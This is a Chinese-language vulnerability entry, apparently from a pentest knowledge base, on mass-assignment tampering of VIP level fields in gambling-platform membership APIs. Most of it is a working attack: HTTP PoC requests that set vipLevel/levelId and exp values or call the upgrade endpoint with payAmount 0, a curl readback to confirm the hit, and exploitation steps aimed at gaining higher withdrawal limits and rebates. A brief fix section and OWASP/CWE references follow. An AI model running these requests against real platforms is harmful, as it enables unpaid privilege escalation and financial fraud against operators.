---
title: VIP/等级接口参数篡改（免费拿高等级权益）
cve: 无（业务逻辑）
severity: high
cvss: 8.1
product: 自研会员体系（博彩/包网）
versions: 任意
ports: 80, 443
keywords: vip, level, 等级, 权益, 参数篡改, 会员
entry: /api/user/level 或资料更新里的 vipLevel/levelId
verified: false
sources: 公开资料整理（业务逻辑类，无 CVE）
---

## 指纹

```
/api/user/info        → 返回 vipLevel / levelId / exp / growth
/api/user/update      → 请求体可能接受同名参数
/api/vip/upgrade      → 升级接口
```

## 前置条件

- 普通会员账号；能抓到资料更新或升级请求。

## PoC

```http
### 1) 资料更新里塞等级字段
POST /api/user/update HTTP/1.1
Authorization: Bearer <token>
Content-Type: application/json

{"nickname":"x","vipLevel":9,"levelId":9,"exp":9999999,"growth":9999999}
```

```http
### 2) 升级接口直接指定目标等级
POST /api/vip/upgrade HTTP/1.1

{"levelId":9,"payAmount":0,"couponId":null}
```

```bash
# 3) 回读确认
curl -s https://target/api/user/info -H "Authorization: Bearer <token>" | jq '.data.vipLevel,.data.levelId'
# 判定：回读变成 9 = 命中；仍是原等级 = 后端白名单挡住了
```

## 利用步骤

1. 先打 1（改资料），回读确认；
2. 不行再打 2（升级接口），注意 `payAmount:0`；
3. 高等级常带"提现额度/返水比例/专属客服"——权益变化就是危害证明；
4. 证据：请求 + 回读的等级字段。

## 修复与缓解

- 等级只由服务端按累计流水计算；更新接口白名单字段。
- 升级接口校验支付单与等级映射表。

## 参考

- OWASP Mass Assignment；CWE-915。
